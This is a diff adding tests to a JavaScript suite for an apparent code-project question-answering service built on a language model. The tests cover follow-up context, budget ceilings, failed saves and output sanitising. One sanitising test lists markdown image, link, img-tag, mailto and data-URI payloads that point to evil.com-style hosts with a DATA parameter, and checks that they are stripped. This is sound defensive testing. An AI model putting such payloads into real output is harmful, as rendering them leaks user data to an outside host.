@@ -300,7 +300,11 @@ test('follow-ups carry the last ten turns as plain text, capped in length', asyn
   const { requests } = await ask([answerJson({ paragraphs: [{ text: 'Billing uses Stripe.', source_ids: [RULE] }] })], { history });
   const msgs = requests[0].messages;
   assert.strictEqual(msgs.length, 21);
-  assert.deepStrictEqual(msgs[0], { role: 'user', content: 'q2' });
+  // The project context leads the first turn, then the oldest kept question.
+  assert.strictEqual(msgs[0].role, 'user');
+  assert.match(msgs[0].content[0].text, /<project_context>/);
+  assert.deepStrictEqual(msgs[0].content[1], { type: 'text', text: 'q2' });
+  assert.deepStrictEqual(msgs[20], { role: 'user', content: 'How is billing handled?' });
   assert.strictEqual(msgs[19].content.length, LIMITS.historyChars);
   assert.deepStrictEqual(historyMessages([{ question: 'q', answer: null }]), []);
 });
@@ -319,6 +323,92 @@ test('a quote can span code lines: the line numbers shown to the model are not p
   const sources = new Map([[CHARGE, { kind: 'code', path: 'src/billing/charge.js', sha: 'c'.repeat(40), start: 1, end: 4, text: "1\timport { stripe } from './stripe';\n2\texport function chargeCard(id) {" }]]);
   const out = checkAnswer({ paragraphs: [{ text: `It runs "from './stripe'; export function chargeCard(id) {".`, source_ids: [CHARGE] }] }, sources, { project });
   assert.strictEqual(out.paragraphs.length, 1);
+});
+
+test('a follow-up starts with the same tools, system and context as the question before it', async () => {
+  const one = await ask([answerJson({ paragraphs: [{ text: 'Billing uses Stripe.', source_ids: [RULE] }] })], { question: 'q1' });
+  const two = await ask([answerJson({ paragraphs: [{ text: 'Billing uses Stripe.', source_ids: [RULE] }] })], { question: 'q2', history: [{ question: 'q1', answer: one.row.content }] });
+  const a = one.requests[0];
+  const b = two.requests[0];
+  assert.deepStrictEqual([b.tools, b.system], [a.tools, a.system]);
+  assert.deepStrictEqual(b.messages[0], a.messages[0], 'the first turn, the cached prefix, is the same');
+});
+
+test('after a fallback, only the answering model’s text is the answer', async () => {
+  const { row } = await ask([{
+    model: 'claude-sonnet-5-5', stop_reason: 'end_turn', usage: usage(),
+    content: [
+      { type: 'text', text: '{"paragra' },
+      { type: 'fallback', model: 'claude-sonnet-5-5' },
+      { type: 'thinking', thinking: 'x', signature: 's' },
+      { type: 'text', text: JSON.stringify({ paragraphs: [{ text: 'Billing uses Stripe.', source_ids: [RULE] }], plan_silent: false, not_built: false, suggested_agreement: null, didnt_get_to: null }) },
+    ],
+  }]);
+  assert.strictEqual(row.status, 'done');
+  assert.strictEqual(row.error, null);
+});
+
+test('a round with an outsized prompt makes the next one the last, with the final-round note', async () => {
+  const { requests } = await ask([
+    toolUse([['get_agreements', {}]], { usage: usage({ input_tokens: 2000, cache_read_input_tokens: 99000 }) }),
+    answerJson({ paragraphs: [{ text: 'Billing uses Stripe.', source_ids: [RULE] }] }),
+  ]);
+  assert.deepStrictEqual(requests.map((r) => r.tool_choice.type), ['auto', 'none']);
+  const turn = requests[1].messages[requests[1].messages.length - 1].content;
+  assert.deepStrictEqual(turn[turn.length - 1], { type: 'text', text: FINAL_ROUND_NOTE });
+});
+
+test('mid-answer, a spend that can’t be read or a person’s monthly ceiling stops the answer', async () => {
+  const quiet = console.error; console.error = () => {};
+  try {
+    const { client } = scripted([toolUse([['get_agreements', {}]]), answerJson({ paragraphs: [] })]);
+    const askMessages = { ...fakeMessages(), usage: async () => { throw new Error('db down'); } };
+    const { tools } = setup();
+    const row = await runQuestion({ project, question: 'q', config, answer: { id: 'a1', user_id: 'u2' }, deps: { askMessages, client, createTools: () => tools } });
+    assert.deepStrictEqual([row.status, row.error], ['failed', 'usage_unavailable']);
+  } finally { console.error = quiet; }
+  const { client } = scripted([toolUse([['get_agreements', {}]]), answerJson({ paragraphs: [] })]);
+  const askMessages = { ...fakeMessages(), usage: async () => ({ spentThisMonth: 1, spentByUserThisMonth: 40, spentAllThisMonth: 50 }) };
+  const { tools } = setup();
+  const row = await runQuestion({ project, question: 'q', config: { ...config, userMonthlyUsd: 40, globalMonthlyUsd: 300 }, answer: { id: 'a1', user_id: 'u2' }, deps: { askMessages, client, createTools: () => tools } });
+  assert.deepStrictEqual([row.status, row.error, row.content], ['failed', 'monthly_budget', MESSAGES.budget]);
+});
+
+test('an answer that couldn’t be saved is not shown as done', async () => {
+  const { client } = scripted([answerJson({ paragraphs: [{ text: 'Billing uses Stripe.', source_ids: [RULE] }] })]);
+  const askMessages = { ...fakeMessages(), finishAnswer: async () => null };
+  const { tools } = setup();
+  const row = await runQuestion({ project, question: 'q', config, answer: { id: 'a1', user_id: 'u2' }, deps: { askMessages, client, createTools: () => tools } });
+  assert.deepStrictEqual([row.status, row.error, row.content], ['failed', 'not_saved', MESSAGES.failed]);
+  assert.ok(!String(row.content).includes('Stripe'));
+});
+
+test('nothing in an answer or a source can become a link, image or tag when rendered', () => {
+  const cases = [
+    '![x][r]\n\n[r]: //evil.com/p.png?d=DATA',
+    'see [docs][1]\n[1]: https://evil.com/?d=DATA',
+    'go to www.evil.com/?d=DATA now',
+    'a //evil.com/p?d=DATA b',
+    'x<img src=//e.com/?q=DATA',
+    'mail mailto:x@evil.com?d=DATA and ftp://evil.com/DATA and HTTPS://EVIL.COM/DATA',
+    'data:text/html;base64,DATA',
+  ];
+  for (const c of cases) {
+    const t = cleanParagraph(c);
+    assert.ok(!/DATA|evil|<|\]:|\/\//.test(t), `${JSON.stringify(c)} -> ${JSON.stringify(t)}`);
+  }
+  assert.strictEqual(cleanParagraph('a > b and the docs'), 'a  b and the docs');
+  const sources = new Map([
+    [RULE, { kind: 'plan', sha: 'c'.repeat(40), area: 'billing ![i](//e.com/x)', text: 'Rule ![i](https://e.com/?d=1) text' }],
+    ['agr_x', { kind: 'agreement', text: 'See www.e.com/x', status: 'accepted' }],
+    ['file:src/a.js@cccccccccccc', { kind: 'file', path: 'src/a.js', sha: 'c'.repeat(40) }],
+  ]);
+  const out = checkAnswer({ paragraphs: [{ text: 'Billing.', source_ids: [RULE, 'agr_x'] }, { text: 'There is an a.js.', source_ids: ['file:src/a.js@cccccccccccc'] }] }, sources, { project });
+  assert.ok(!/e\.com|!\[/.test(JSON.stringify(out.sources)), JSON.stringify(out.sources));
+  assert.strictEqual(out.sources[2].label, 'File in the repo @ cccccccccccc');
+  assert.strictEqual(out.sources[2].url, `https://github.com/acme/delta/blob/${'c'.repeat(40)}/src/a.js`);
+  assert.strictEqual(out.paragraphs[1].code_only, true);
+  assert.strictEqual(progressText('read_file', { path: 'a ![x](//e.com/p) b' }), 'Reading a b');
 });
 
 // The sources a tool returned, read back from the tool result the model was sent.
